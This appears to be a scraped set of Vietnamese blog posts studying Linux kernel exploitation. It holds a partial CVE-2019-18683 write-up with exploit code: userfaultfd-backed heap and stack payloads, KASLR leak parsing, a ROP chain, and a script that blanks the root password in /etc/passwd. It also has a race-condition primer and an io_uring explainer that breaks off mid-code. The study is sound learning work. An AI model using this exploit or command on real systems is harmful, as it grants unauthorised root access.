\u0026mdash; \u0026mdash; 1. catch 44 page faults from setxattr() called by sprayers 2. wait on barrier \u0026mdash; \u0026mdash; 1. wait on barrier 2. trigger the payload for privilege escalation 3. the end! Chưa nắm vững / hiểu rõ các pthread được liệt kê trong bảng trên\rVấn đề đặt ra với tôi bây giờ là làm sao để điều khiển các thread giống như table trên. Quay lại môn OS và nhận ra mình chả nhớ gì cả == hậu quả của việc học vẹc. Bây giờ bắt đầu học về nó\u0026hellip;\nOke, đã hiểu, chúng ta có barrier là rào cản, khi đủ thread thì nó sẽ mở cửa, vậy làm sao mình quản lí được khi nào cần 2 thread, khi nào cần 44 thread? Đơn giản chúng ta dự vào function, và đặt barrier vào cuối những function trên. Good, Tôi đã hiểu được đoạn này và đã có idea tiếp tục làm. Anatomy of the exploit payload Payload sẽ được tạo ở 2 nơi: Trong kernel heap bằng sprayer threads bằng cách sử dụng hàm setxattr() được xử lí bởi userfaultfd() Trong kernel stack bằng racer threads bằng cách sử dụng adjtimex() được xử lí bởi userfaultfd(). System call này được chọn vì nó có gọi hàm copy_from_user() tới kernel stack. Payload gồm 3 phần: vb2_buffer trong kernel heap. vb2_queue trong kernel stack. vb2_mem_ops: trong kernel stack. Dưới đây là chương trình tạo payload. Bắt đầu phần khai thác, ta chuẩn bị nội dung của payload ở userspace, vùng nhớ được tạo bởi setxattr() syscall sẽ được đưa vào kernel heap. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #define MMAP_SZ 0x2000 #define PAYLOAD_SZ 504 void init_heap_payload() { struct vivid_buffer *vbuf = NULL; struct vb2_plane *vplane = NULL; for_heap = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_heap == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_heap is mmaped to %p\\n\u0026#34;, for_heap); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_heap, 0, PAGE_SIZE); xattr_addr = for_heap + PAGE_SIZE - PAYLOAD_SZ; vbuf = (struct vivid_buffer *)xattr_addr; vbuf-\u0026gt;vb.vb2_buf.num_planes = 1; vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;bytesused = 16; vplane-\u0026gt;length = 16; vplane-\u0026gt;min_length = 16; printf(\u0026#34; [+] vivid_buffer of size %lu is at %p\\n\u0026#34;, sizeof(struct vivid_buffer), vbuf); } adjtimex() syscall ghi dữ liệu vào kernel stack 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #define PAYLOAD2_SZ 208 void init_stack_payload() { for_stack = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (for_stack == MAP_FAILED) err_exit(\u0026#34;[-] mmap\u0026#34;); printf(\u0026#34; [+] payload for_stack is mmaped to %p\\n\u0026#34;, for_stack); /* Don\u0026#39;t touch the second page (needed for userfaultfd) */ memset(for_stack, 0, PAGE_SIZE); timex_addr = for_stack + PAGE_SIZE - PAYLOAD2_SZ + 8; printf(\u0026#34; [+] timex of size %lu is at %p\\n\u0026#34;, sizeof(struct timex), timex_addr); } Sau khi bị race condition, pthread sẽ phân tích cú pháp của kmsg, trích xuất thông tin từ kernel warning: Giá trị RSP để tính địa chỉ đỉnh của kernel stack Giá trị R11 trỏ đến một số vị trí không đổi trong kernel code. Giá trị này giúp tính toán offset của KASLR. 1 2 3 4 5 6 7 8 9 10 #define R11_COMPONENT_TO_KASLR_OFFSET 0x195d80d #define KERNEL_TEXT_BASE 0xffffffff81000000 kaslr_offset = strtoul(r11, NULL, 16); kaslr_offset -= R11_COMPONENT_TO_KASLR_OFFSET; if (kaslr_offset \u0026lt; KERNEL_TEXT_BASE) { printf(\u0026#34;bad kernel text base 0x%lx\\n\u0026#34;, kaslr_offset); err_exit(\u0026#34;[-] kmsg parsing for r11\u0026#34;); } kaslr_offset -= KERNEL_TEXT_BASE; Sau đó, pthread phân tích cú pháp của kmsg, điều chỉnh payload trên heap và stack. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #define TIMEX_STACK_OFFSET 0x1d0 #define LIST_OFFSET 24 #define OPS_OFFSET 64 #define CMD_OFFSET 172 struct vivid_buffer *vbuf = (struct vivid_buffer *)xattr_addr; struct vb2_queue *vq = NULL; struct vb2_mem_ops *memops = NULL; struct vb2_plane *vplane = NULL; printf(\u0026#34;Adapt payloads knowing that kstack is 0x%lx, kaslr_offset 0x%lx:\\n\u0026#34;, kstack, kaslr_offset); /* point to future position of vb2_queue in timex payload on kernel stack */ vbuf-\u0026gt;vb.vb2_buf.vb2_queue = (struct vb2_queue *)(kstack - TIMEX_STACK_OFFSET); vq = (struct vb2_queue *)timex_addr; printf(\u0026#34; vb2_queue of size %lu will be at %p, userspace %p\\n\u0026#34;, sizeof(struct vb2_queue), vbuf-\u0026gt;vb.vb2_buf.vb2_queue, vq); /* just to survive vivid list operations */ vbuf-\u0026gt;list.next = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); vbuf-\u0026gt;list.prev = (struct list_head *)(kstack - TIMEX_STACK_OFFSET + LIST_OFFSET); /* * point to future position of vb2_mem_ops in timex payload on kernel stack; * mem_ops offset is 0x38, be careful with OPS_OFFSET */ vq-\u0026gt;mem_ops = (struct vb2_mem_ops *)(kstack - TIMEX_STACK_OFFSET + OPS_OFFSET); printf(\u0026#34; mem_ops ptr will be at %p, userspace %p, value %p\\n\u0026#34;, \u0026amp;(vbuf-\u0026gt;vb.vb2_buf.vb2_queue-\u0026gt;mem_ops), \u0026amp;(vq-\u0026gt;mem_ops), vq-\u0026gt;mem_ops); memops = (struct vb2_mem_ops *)(timex_addr + OPS_OFFSET); /* vaddr offset is 0x58, be careful with ROP_CHAIN_OFFSET */ memops-\u0026gt;vaddr = (void *)ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET + kaslr_offset; printf(\u0026#34; mem_ops struct of size %lu will be at %p, userspace %p, vaddr %p at %p\\n\u0026#34;, sizeof(struct vb2_mem_ops), vq-\u0026gt;mem_ops, memops, memops-\u0026gt;vaddr, \u0026amp;(memops-\u0026gt;vaddr)); Lược đồ thể hiện mối quan hệ giữa các thành phần bên trong kernel memory.\nChưa thực sự hiểu lược đồ\rROP\u0026rsquo;n\u0026rsquo;JOP Tiếp theo sẽ tạo ra ROP chain để khai thác lỗi.\nTừ lược đồ, có thể thấy void *(*vaddr)(void *buf_priv) là nơi chúng ta kiểm soát luồng thực thi để tấn công. Tham số buf_priv được lấy từ vb2_plane.mem_priv và giá trị này thuộc quyền kiểm soát của chúng ta. Trong linux kernel x86_64, tham số đầu của hàm sẽ được lưu trong thanh ghi RDI, Vì thế chuỗi lệnh push rdi; pop rsp sẽ đưa stack pointer tới nơi mà chúng ta muốn RDI. Tiêp theo ROP chain cho mục đích leo thang đặc quyền: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #define ROP__PUSH_RDI__POP_RSP__pop_rbp__or_eax_edx__RET 0xffffffff814725f1 #define ROP__POP_R15__RET 0xffffffff81084ecf #define ROP__POP_RDI__RET 0xffffffff8101ef05 #define ROP__JMP_R15 0xffffffff81c071be #define ADDR_RUN_CMD 0xffffffff810b4ed0 #define ADDR_DO_TASK_DEAD 0xffffffff810bf260 unsigned long *rop = NULL; char *cmd = \u0026#34;/bin/sh /home/a13x/pwn\u0026#34;; /* rewrites /etc/passwd to drop root password */ size_t cmdlen = strlen(cmd) + 1; /* for 0 byte */ /* mem_priv is the arg for vaddr() */ vplane = vbuf-\u0026gt;vb.vb2_buf.planes; vplane-\u0026gt;mem_priv = (void *)(kstack - TIMEX_STACK_OFFSET + ROP_CHAIN_OFFSET); rop = (unsigned long *)(timex_addr + ROP_CHAIN_OFFSET); printf(\u0026#34; rop chain will be at %p, userspace %p\\n\u0026#34;, vplane-\u0026gt;mem_priv, rop); strncpy((char *)timex_addr + CMD_OFFSET, cmd, cmdlen); printf(\u0026#34; cmd will be at %lx, userspace %p\\n\u0026#34;, (kstack - TIMEX_STACK_OFFSET + CMD_OFFSET), (char *)timex_addr + CMD_OFFSET); /* stack will be trashed near rop chain, be careful with CMD_OFFSET */ *rop++ = 0x1337133713371337; /* placeholder for pop rbp in the pivoting gadget */ *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_RUN_CMD + kaslr_offset; *rop++ = ROP__POP_RDI__RET + kaslr_offset; *rop++ = (unsigned long)(kstack - TIMEX_STACK_OFFSET + CMD_OFFSET); *rop++ = ROP__JMP_R15 + kaslr_offset; *rop++ = ROP__POP_R15__RET + kaslr_offset; *rop++ = ADDR_DO_TASK_DEAD + kaslr_offset; *rop++ = ROP__JMP_R15 + kaslr_offset; printf(\u0026#34; [+] the payload for kernel heap and stack is ready. Put it.\\n\u0026#34;); Cách thức hoạt động của ROP chain ROP chain đưa địa chỉ của hàm run_cmd() từ kernel/reboot.c vào thanh ghi R15. Lưu địa chỉ của lệnh shell vào thanh ghi RDI. Địa chỉ này sẽ lưu tham số của hàm run_cmd(). Chương trình sẽ nhảy tới run_cmd() để thực thi /bin/sh /home/edisc/pwn với quyền root. Đoạn mã này sẽ viết lại /etc/passwd cho phép chúng ta đăng nhập với quyền root mà không cần password. 1 2 3 #!/bin/sh # drop root password sed -i \u0026#39;1s/.*/root::0:0:root:\\/root:\\/bin\\/bash/\u0026#39; /etc/passwd ROP chain nhảy tới __noreturn_do_task_dead() trong kernel/exit.c. Thao tác này nhằm tránh trường hợp kthread hiện tại không dừng, nó sẽ làm kernel crash - chúng ta không muốn điều đó. Một số ảnh hưởng tới việc khai thác Có mốt số tính năng của kernel có thể ảnh hưởng tới việc khai thác của chúng ta:\nThiết lập /proc/sys/vm/unprivileged_userfaultfd vê 0 sẽ không cho phép payload được lưu trong kernel. Việc này gây ra hạn chế, userfaultfd() chỉ hoạt động bởi privileged users (với SYS_CAP_PTRACE capability). Thiết lập kernel.dmesg_restrict sysctl về 1 sẽ chặn rò rỉ thông tin qua kernel log. VIệc này hạn chế người dùng đọc thông tin từ kerbel syslog qua dmesg. Tuy nhiên, dù cho kernel.dmesg_restrict = 1. Người dùng Ubuntu từ group adm vẫn có thể đọc kernel log từ /var/log/syslog. Bản vá của grsecurity/PaX có một tính năng gọi là PAX_RANDKSTACK làm khó khăn cho việc đoán vị trí của vb2_qeue. PAX_RAP từ bản vá của grsecurity/PaX có thể chặn ROP/JOP chain mô tả ở trên. poc detail Tiếp theo chúng ta tiến hành viết poc để khai thác lỗi trên\nMôi trường thực thi qemu ubuntu server 18.04.3 How To Install \u0026ldquo;linux-tools-virtual-lts-vivid\u0026rdquo; Package on Ubuntu Trong quá trình cài đặt và kiểm tra với lệnh getfacl /dev/video0 có thể bạn sẽ bị lỗi vì thiêu thư mục dev/video0. Bài viết này giúp tôi giải quyết được vấn đề này. Cài đặt KASAN để debug Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor Chúng ta tiến hành tạo và chạy setxattr_userfaultfd và adjtimex_userfaultfd để giám sát và xử lí lỗi pagefault 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 void init_setxattr_userfaultfd(){ long uffd; /* userfaultfd file descriptor */ /* start of region handled by userfaultfd */ unsigned long len; /* Length of region handled by userfaultfd */ pthread_t thr; /* ID of thread taht handles pagefaults */ struct uffdio_api uffdio_api; struct uffdio_register uffdio_register; int s; printf(\u0026#34;[+] init_setxattr_userfaultfd\\n\u0026#34;); page_size = sysconf(_SC_PAGE_SIZE); printf(\u0026#34;[*] pagesize = %lf\\n\u0026#34;, page_size); pthread_t thr2[100] = { 0 }; len = 4 * page_size; /* Create and enable userfaultfd object */ uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uffd == -1) err_exit(\u0026#34;userfaultfd\u0026#34;); uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, \u0026amp;uffdio_api) == -1) err_exit(\u0026#34;ioctl-UFFDIO_API\u0026#34;); /* Create a private anonymous mapping. The memory will be demand-zero paged--that is, not yet allocated. When we actually touch the memory, it will be allocated via the userfaultfd. */ xattr_addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf(\u0026#34;[+] The sexattr_addr anonymous page_addr: %p\\n\u0026#34;, xattr_addr); if (xattr_addr == MAP_FAILED) err_exit(\u0026#34;mmap\u0026#34;); uffdio_register.range.start = (unsigned long)xattr_addr + 2 * page_size; uffdio_register.range.len = 2*page_size; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, \u0026amp;uffdio_register) == -1) err_exit(\u0026#34;ioctl-UFFDIO_REGISTER\u0026#34;); /* Create a thread that will process the userfaultfd events */ s = pthread_create(\u0026amp;thr, NULL, fault_handler_thread, (void*)uffd); if (s != 0){ errno = s; err_exit(\u0026#34;pthread_create\u0026#34;); } } Trong hàm này, tôi chú ý tới một số điểm - những điểm này đối với tôi ở thời điểm hiện tại đọc không hiểu / chưa hiểu rõ:\nHàm sysconf(_SC_PAGE_SIZE): Nguồn tham khảo https://www.programmersought.com/article/80733633259/ https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid https://www.anquanke.com/post/id/200029 ","description":"Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)","id":14,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"Tìm hiểu về CVE-2019-18683","uri":"https://minhlongmt183.github.io/posts/cve-2019-18683/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ Winning the race: Signals, symlinks, and TOC/TOU\rGiới thiệu Không phải tất cả race condition đều là lỗ hổng, những phần lớn các race condition sẽ dẫn tới lỗ hổng ở một nơi nào đó. Nói cách khác, những lỗ hổng hình thành do race condition thường là những lỗ hổng cực kì nghiêm trọng. Trong lập trình đa luồng, race conditions không phải là việc xuất hiện vấn đề và ta khai thác, nó chỉ là việc luồng thực thi không giống như chúng ta kì vọng. Bugs có thể tồn tại ở mọi nơi, từ những ứng dụng Linux ở cấp thấp cho đến triển khai DBMS quan hệ đa luồng. Race conditions là gì? Hãy tưởng tượng bạn đang tham gia cuộc thi chạy điền kinh và đối thủ của bạn lại là chị Nguyễn Thi Thúy Hiền. Vì đã rất nỗ lực, bạn và chị Hiền ngang tài ngang sức và cũng bước vào giai đoạn nước rút về đích. Thật bất ngờ, cả 2 cùng chạm đích cùng một lúc, hệ thống cho thấy cả 2 chạm vạch đích cùng thời điểm đến hàng nano giây. Nếu chỉ chọn 1 quán quân vậy ai sẽ là quán quân? Bạn ? Hay chị Hiền? Hay cả 2 (việc này sẽ làm giảm giá trị của chức quán quân)? Hay chẳng ai cả? tổ chức thi đấu lại? Mọi khả năng đều có thể xảy ra và chẳng ai biết khả năng nào sẽ xảy ra. Race condition trong trường hợp này cũng tương tự như vậy. Race conditions là một chủ đề cực kì lớn, với nhiều hàm ý bảo mật khác nhau, từ hành vi không dự đoán trước được, không có vẻ nguy hiểm gì cho đến sự cố máy chủ, chiếm quyền điều khiển bằng thực thi dòng lệnh từ xa. Nó bắt nguồn từ việc lập trình viên giả sử chương trình của mình đang chạy tuyến tính hoặc đang chạy song song nhưng không xem xét triệt để, an toàn. Chương trình của họ có thể hoàn hảo khi chạy 1 hoạt động (operation), những khi chạy 2 hay nhiều operations trên nhiều process khác nhau, nó có thể dẫn tới luồng thực thi bị thay đổi, dẫn tới kết quả không mong muốn đối với victim (hoặc mong muốn - đối với attacker). Race conditons không phải luôn là lỗ hổng bảo mật vì một số trường hợp, những hành vi không mong muốn được phát sinh này không mang lại nguy hiểm nào đối với hệ thống cả. Race conditons có thể xuất hiện ở nhiều ngữ cảnh, thậm chí tồn tại ngay trong những thiết bị điện tử cơ bản (cả điện sinh học. Race condtions đã tìm thấy bên trong não của chuột sống). Tiền đề cơ bản cho race conditions là 2 thread chống lại nhau để tìm người thắng cuộc. Người thắng có quyền thao túng luồng thực thi của ứng dụng. 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;signal.h\u0026gt; // keep an eye out for this header especially #include \u0026lt;race_conditon.h\u0026gt; int main(void){ if (something == permitted){ doThis(); } else { printf(\u0026#34;lolnope\\n\u0026#34;); } } Thông thường, race conditons có xu hướng xuất hiện trong những ứng dụng viết bằng C. Đặc biệt trong những chương trình có sử dụng thư viện signal.h vì header này xuất hiện dự báo rằng chương trình sẽ có những race tìm ẩn để dẫn tới số lượng tín hiệu xử lí là ít nhất. Mặt khác, nếu kiểm tra quyền của các tệp có xuất hiện các symlink races cũng cho thấy có nguy cơ về race condition. Đoạn code trên chỉ là mã giả, nó sẽ không chạy, mục đích của đoạn mã giả nhằm giúp chúng ta có cái nhìn trực quan hơn về kiểu tấn công dựa trên race condition. Gỉa sử attacker gửi hai operations tới chương trình tại cùng thời điểm, cùng 1 trạng thái trên luồng mã thực thi (nếu được). Nếu như thời gian chính xác, attacker có thể cho phép một biến nào đó đúng / hoặc sai tại một thời điểm kiểm tra, nhưng biến này không còn được sử dụng tại thời điểm đó. (Này được gọi là TOC/TOU race có nghĩa là Time of Check, Time of Use)\nGiả sử, chúng ta thực hiện lệnh 1 if (something_is_permitted) // check if permitted Nếu điều kiện đúng thì nó sẽ thực thi doThis() giống như kì vọng của tác giả, tuy nhiên nếu somethig_is_not_permitted mà hàm if này vẫn chấp nhận thì khi thực hiện doThis() sẽ có nguy cơ phát sinh những trường hợp không mong muốn, và tuy theo mã sau đó thế nào mà attacker có thể bypass access controls, escalate privileges, cause a denial of service\nKhi nói về Race Conditions, mọi người thường nghĩ tới những thứ gì đó rất nhanh, thời gian phải cực kì chính xác để có thể thực thi TOC/TOU race. Điều này không sai, tuy nhiên không phải lúc nào cũng vậy. Cùng xem xét ví dụ về lỗi `slow-paced\u0026quot; race condition: Có một ứng dụng mạng xã hội, người dừng có thể sử đổi thông tin của họ. Một user click vào nút \u0026ldquo;edit profile\u0026rdquo;, ứng dụng mở ra một trang web cho phép họ thực hiện sửa đổi. User tiến hành sử đổi bằng bàn phím (go AFK - Away from Keyboard). Quản trị viên nhìn thấy những lỗi không mong muốn trong chức năng sửa đổi thông tin trên website, nên quyết định tắt chức năng này. Do đó, user không thể dùng nó để sửa thông tin của họ. Quay lại với user trên, anh ta vẫn còn đang ở trong trang web cho việc sửa đổi thông tin. Mặc dù new user không thể truy cập vào trang \u0026ldquo;edit profile\u0026rdquo;, nhưng user này vẫn còn trang web cho việc sửa đổi thông tin nên anh ta vẫn có thể tiếp tục sửa đổi, mặc dù chức năng này đã bị quản trị viên tắt. Race conditons có thể được gây ra do độ trễ trong networks. Giả sử có một hub và 2 linked nodes. Bob muốn đăng kí một channel #hax và Alice cũng muosn đăng kí cùng chanel này. Xem xét trường hợp sau: Bob kết nối tới IRC từ node #1 Alice kết nối tới IRC từ node #2 Bob chạy /join #hax Alice chạy /join #hax Cả hai câu lệnh đều được thực hiện từu 2 node khác nhau, cùng 1 thời điểm. Bob trở thành người điều hành của #hax. Alic trở thành người điều hành của #hax. Nguyên nhân cho trường hợp này bởi vì độ trễ mạng, node #1 sẽ có thời gian gửi tín hiệu tới node #2 để cảnh báo rằng Services Daemon đã bị người khác nắm giữ trên cùng network. (PROTIP: When testing local desktop applications for Race Conditions - for example a compiled binary - use something like GDB or OllyDBG to set a breakpoint between TOC and TOU within the source code of the binary you are debugging. Execute your code from the breakpoint and take note of the results in order to determine any potential security risk or lack thereof. This is for confirmation of the bug only, and not for actual exploitation. As the saying goes, PoC||GTFO. This rings especially true with race conditions considering some of them are just bugs or glitches or whatever you wanna call them, as opposed to viable exploits with real attack value. If you cannot demonstrate impact, you probably should not report it)\r","description":"Trong quá trình reproduce CVE-2019-18683, tôi nhận ra hiểu biết của mình về race condtion quá ít và hạn hẹp, bài viết này với mục đích note lại những kiến thức liên quan về race condtion","id":15,"section":"posts","tags":["cve, linux kernel, race condition"],"title":"Wining the racing","uri":"https://minhlongmt183.github.io/posts/wining_the_racing/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.\rĐôi nét về io_uring io_uring Asynchronous I/O (AIO) framework là một giao diện I/O mới cho Linux, được giới thiệu trên linux kernel version 5.1 (tháng 3 - 2019).\nCommunication channel From: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nio_uring instance có 2 vòng, submission queue (SQ) và completion queue (CQ) được chia sẻ giữa kernel và ứng dụng. Những hàng đợi: single producer, single consumer cung cấp 1 giao diện ít khóa, và được phối hợp với rào cản bộ nhớ (memory barrier). Application sẽ tạo một hoặc nhiều SQ entry (SQE) và sẽ cập nhật vào đuôi của hàng đợi SQ. Kernel cũng sử dụng SQE, nó sẽ cập nhật vào đầu của hàng đợi SQ. Kernel sẽ tạo một hoặc nhiều CQ entry (CQE) và sẽ cập nhật vào đuôi của hàng đợi CQ. Application cũng sử dụng thằng CQE này và cập nhật từ đầu của hàng đợi CQ. Systemcall API io_uring API gồm 3 system call chính bao gồm: io_uring_setup, io_uring_register, io_uring_enter\nio_uring_setup Thiết lập một ngữ cảnh để thực hiện chạy IO bất đồng bộ.\n1 int io_uring_setup(u32 entries, struct io_uring_params *p); Lệnh này sẽ tiến hành thiết lập 2 hàng đợi submission queue và completion queue với số lượng các phần tử entries ít nhất. Trả về một file description để thực hiện các hoạt động tiếp theo trên phiên bản io_uring. 2 hàng đợi này được chia sẻ giữa kernel và application, giúp giảm chi phí khi dữ liệu giao tiếp giữa 2 bên (ko cần phải sao chép) khi khởi tạo và thực thi I/O.\nNhững tham số được sử dụng bởi application để cấu hình cho io_uring instance và kernel sẽ trả lại thông tin về cấu hình đến 2 hàng vòng buffer.\nio_uring instance có thể được cấu hình ở 3 chế độ hoạt động chính:\nInterrupt driven Mặc định, io_uring instance sẽ được thiết lập để điều khiển IO khi lỗi, IO có thể được gửi bằng io_uring_enter() và được lấy trực tiếp từ completion queue. Polled: thực hiện chế độ chờ I/O hoàn thành. File hệ thống và những thiết bị khối (block device) cần phải được hỗ trợ mới sử dụng tính năng này. Tính năng này giúp giảm thiểu độ trễ khi thực hiện IO, tuy nhiên nó lại tốn nhiều resource của CPU hơn việc thực hiện Interrupt. Hiện nay, tính năng này chỉ thực hiện với những file descriptor được mở kèm với cờ O_DIRECT.\nKhi đọc hoặc viết vào ngữ cảnh đã thiết lập poll thì ứng dụng phải tiến hành xem tình trạng hoàn thành trên CQ ring bằng lệnh io_uring_enter(). Việc trộn và kết hợp I / O đã được thăm dò và không được thăm dò trên một phiên bản io_uring là ko được phép. Kernel polled: Trong chế độ này, kernel thread được tạo để thăm dò hàng đợi gửi (submission queue). Một io_uring instanceđược cấu hình theo cách này cho phép ứng dụng xử lí I/O mà không cần xuống kernel. Bằng việc dùng submisstion queue để điền những SQE mới và kiểm tra tình trạng hoàn thành trên completion queue, ứng dụng có thể submit và lấy kết quả I/O mà không cần thực hiện system call.\nTrường hợp kernel rảnh rỗi hơn tổng thời gian người dùng cấu hình, nó sẽ tiếp tục nhàn rỗi đến khi nhận được thông báo từ ứng dụng. Trong trường hợp này, ứng dụng gọi lệnh io_uring_enter() để tiến hành đánh thức kernel.\nio_uring_setup() sẽ trả về một fd (file descripton), giá trị này được sử dụng cho mmap để tạo 2 hàng đợi SQ và CQ, và có thể được sử dụng bởi 2 system call io_uring_register() và io_uring_enter() io_uring_register Những file được đăng kí hoặc user buffer chạy IO bất đồng bộ.\n1 int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args); Được sử dụng cho thực thể io_uring được trỏ bởi fd. Việc đăng kí này giúp kernel thread\ncó thời gian tham chiếu tới cấu trúc dữ liệu bên trong kernel liên kết với tệp lâu hơn, hoặc tạo ánh xạ của từng vùng nhớ cụ thể trên ứng dụng với buffer lâu hơn. Chúng ta chỉ cần đăng kí 1 lần thay vì phải thực hiện nhiều lần trong quá trình xử lí, việc này giúp giảm overhead trên IO trong xử lí. Những buffer được đăng kí sẽ bị khóa trên memory và sẽ bị \u0026ldquo;tính phí\u0026rdquo; theo giới hạn RLIMIT_MEMLOCK của người dùng. Thường giới hạn này sẽ là 1GB/buffer. Hiện tại, bộ nhớ đệm phải ẩn danh (ANONYMOUS) và không được sao lưu bằng tệp. Có thể thiết lập 1 vùng đệm lớn rồi chọn 1 phần nhỏ cho I/O, miễn phần nhỏ đó nằm trong vùng được ánh xạ. Ứng dụng có thể tăng, giảm kích thước hoặc số lượng buffer đã đăng kí bằng cách hủy đăng kí buffer hiện tại và đăng kí buffer mới với lệnh io_uring_register(). Một ứng dụng có thể cập nhật động tập các file đã đăng kí mà không cần hủy đăng kí chúng. Có thể sử dụng eventfd để nhận thông báo về các sự kiện hoàn thành trên phiên bản io_uring. Nếu đạt được, một eventfd file descriptor có thể được đăng kí thông qua system call này. Thông tin đăng nhập của ứng dụng đang chạy có thể được đăng kí với io_uring, nó sẽ trả về một id liên kết với các thông tin đã đăng nhập đó. Các ứng dụng muốn chia sẻ vòng kết nối giữa những người dùng / quy trình riêng biệt có thể chuyển vào id thông tin xác thực này trong trường tính cách SQE. Nếu được đặt, SQE cụ thể đó sẽ được cấp với các thông tin xác thực này. io_uring_enter Khởi tạo và hoàn thành I/O bất đồng bộ\nio_uring_enter() dùng để khởi tạo và hoàn thành I/O\tsử dụng hàng đợi submission và completion được thiết lập bởi io_uring_setup(). Một lệnh gọi đơn sẽ bao gồm gửi một I/O mới và đợi phản hồi của lệnh gọi này hoặc tất cả các lệnh gọi trước đó đến io_uring_enter(). 1 2 int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); Trong đó:\nfd file descriptor được return bởi io_uring_setup() to_submit chỉ định số lượng I/O để submit từ submission queue. Nếu được chỉ dẫn nhưu vậy, hệ thống sẽ đợi hoàn thành sự kiện min_complete trước khi quay trở lại. Nếu thực thể io_uring được cấu hình để thăm dò, thì min_complete sẽ có ý nghĩa khác một chút. min_complete: như ở trên đã nói, ngoài ra, nếu nó bằng 0 ý nói kernel sẽ trả về bất kì sự kiện nào đã được hoàn thành mà không bị chặn. Nếu khác 0, kernel chỉ trả về lập tức sự kiện đang hoàn thành. Nếu không có sự kiện hoàn thành nào khả dụng, thì cuộc gọi sẽ thăm dò ý kiến ​​cho đến khi có một hoặc nhiều sự kiện hoàn thành hoặc cho đến khi quá trình vượt quá phần thời gian của bộ lập lịch của nó. Lưu ý rằng đối với I / O được điều khiển gián đoạn, một ứng dụng có thể kiểm tra hàng đợi hoàn thành để biết sự kiện hoàn thành mà không cần nhập hạt nhân. io_uring_enter() hỗ trợ nhiều phép toán, bao gồm: Open, close, and stat files Read and write into multiple buffers or pre-mapped buffers Socket I/O operations Synchronize file state Giám sát bất đồng bộ một tập file descriptors Tạo timeout liên kết tới hoạt động cụ thể trong vòng Cố gắng hủy một hoạt động hiện đang bay (thực hiện) Tạo I/O chains Thực hiện theo thứ tự trong một chuỗi Thực thi song song cho nhiều chuỗi Cơ chế hoạt động Asynchronous execution Không phải lúc nào io_uring cũng chạy bất đồng bộ mà nó chỉ chạy khi nó cần. Nguyên nhân là để giảm thiểu tối đa việc gọi io_uring_enter() system call để tăng hiệu suất của chương trình.\nVí dụ ở đoạn code dưới đây (Kernel 5.8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #define SYSCHK(x) ({ \\ typeof(x) __res = (x); \\ if (__res == (typeof(x))-1) \\ err(1, \u0026#34;SYSCHK(\u0026#34; #x \u0026#34;)\u0026#34;); \\ __res; \\ }) static int uring_fd; struct iovec *io; #define SIZE 32 char _buf[SIZE]; int main(void) { // initialize uring struct io_uring_params params = { }; uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, \u0026amp;params)); unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING)); unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING)); struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, 